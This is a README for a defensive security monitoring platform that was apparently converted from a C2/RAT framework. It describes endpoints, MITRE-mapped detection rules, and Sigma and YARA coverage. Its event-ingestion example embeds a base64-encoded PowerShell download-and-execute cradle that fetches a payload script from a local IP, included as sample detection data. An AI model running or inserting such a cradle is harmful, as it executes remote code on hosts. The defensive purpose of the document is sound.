# Lucy Defense Platform

This document describes the defensive-security transformation applied to Lucy.

## Scope and Purpose

The original Lucy codebase was structured as a Red-Team C2 / RAT framework. The
defensive layer added here converts the project into an **authorized internal
security monitoring and detection platform** with the following capabilities:

- **SIEM-style event ingestion** via REST API.
- **Built-in detection rules** mapped to MITRE ATT&CK.
- **Lightweight authorized scanners** for asset discovery, file integrity, and
  process anomaly detection on hosts you own.
- **YARA and Sigma rules** to detect common post-exploitation behaviors and
  tooling (Mimikatz-like, keyloggers, generic C2 implants).

> **Important:** All scanners and ingestion endpoints must only be used against
> hosts, networks, and data you are explicitly authorized to monitor.

## New Backend Components

| File | Purpose |
|------|---------|
| `backend/defense/detection_engine.py` | Ingests security events, evaluates them against built-in rules, and emits alerts. |
| `backend/defense/scanners/port_scan_defensive.py` | Authorized internal port/asset discovery. |
| `backend/defense/scanners/file_integrity.py` | Monitor integrity of owned critical files. |
| `backend/defense/scanners/process_anomaly.py` | Flag suspicious command-line / process patterns. |
| `backend/api/defense.py` | FastAPI endpoints for events, alerts, rules, scanners, and MITRE mapping. |

## New Frontend Components

| File | Purpose |
|------|---------|
| `frontend/src/pages/Defense.tsx` | Defense Center dashboard (alerts, rules, scanners). |
| `frontend/src/api/defense.ts` | Typed API client for the defense endpoints. |

## API Endpoints

All endpoints are under `/api/v1/defense`.

- `GET  /defense/status` — platform stats.
- `POST /defense/events` — ingest a single event.
- `POST /defense/events/bulk` — ingest multiple events.
- `GET  /defense/events` — list ingested events.
- `GET  /defense/alerts` — list generated alerts.
- `GET  /defense/alerts/unread` — unread alert count.
- `POST /defense/alerts/{id}/read` — mark one alert read.
- `POST /defense/alerts/read-all` — mark all alerts read.
- `GET  /defense/rules` — list active detection rules.
- `GET  /defense/mitre-map` — rule-to-MITRE mapping.
- `GET  /defense/scanners` — list available scanners.
- `POST /defense/scanners/run` — run a scanner on the Lucy backend host.
- `POST /defense/scanners/dispatch` — dispatch a scan to an endpoint sensor.

## Detection Rules (Built-in)

| ID | Name | Severity | MITRE |
|----|------|----------|-------|
| def-001 | Suspicious Process Injection | critical | T1055 |
| def-002 | Credential Dumping Indicator | critical | T1003 |
| def-003 | Persistence via Registry Run Key | high | T1547.001 |
| def-004 | Outbound Connection to Rare Port | medium | T1041 |
| def-005 | Keylogger-like Activity | high | T1056.001 |
| def-006 | Webcam or Screenshot Capture | medium | T1125 |
| def-007 | UAC Bypass Attempt | high | T1548.002 |
| def-008 | Lateral Movement via SMB/PSExec | high | T1021.002 |
| def-009 | Kerberoasting Request | high | T1558.003 |

## Sigma Rules

Located in `backend/defense/rules/sigma/`. They cover:

- Process injection
- Credential dumping / LSASS access
- Registry Run-key persistence
- Encoded PowerShell / Ingress tool transfer
- UAC bypass
- SMB/PSExec lateral movement
- Kerberoasting
- Keylogging
- Screen/webcam capture

## YARA Rules

Located in `backend/defense/rules/yara/`. They cover:

- Generic C2 implant indicators (heartbeat, beacon, task polling, ECDH/AES)
- Mimikatz-like credential dumping strings
- Keylogger API imports and strings

## Running the Platform

1. Install backend dependencies:
   ```bash
   cd backend
   pip install -r requirements.txt
   ```

2. Start the backend:
   ```bash
   uvicorn main:app --reload --host 127.0.0.1 --port 8000
   ```

3. Install and run the frontend:
   ```bash
   cd frontend
   npm install
   npm run dev
   ```

4. Open `http://localhost:5173` (or the Vite dev-server URL) and sign in with
   the seeded admin credentials.

5. Navigate to **Defense Center** to ingest events, review alerts, and run
   authorized scanners.

## Ingestion Example

```bash
curl -X POST http://localhost:8000/api/v1/defense/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "source": "windows-sensor",
    "hostname": "wkstn-01",
    "event_type": "process_creation",
    "details": {
      "image": "powershell.exe",
      "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="
    }
  }'
```

The detection engine will evaluate the event and create an alert if any rule
matches.

## Next Steps

- Persist defense events and alerts to the SQLite database (currently kept in
  memory for the MVP).
- Integrate Windows Event Log / Sysmon forwarding into the ingestion pipeline.
- Add scheduled file-integrity and process-anomaly scans via Celery or the
  in-memory worker.
- Export Sigma rules to a SIEM (Splunk, Elastic, Sentinel) using `sigmac` or the
  Sigma CLI.
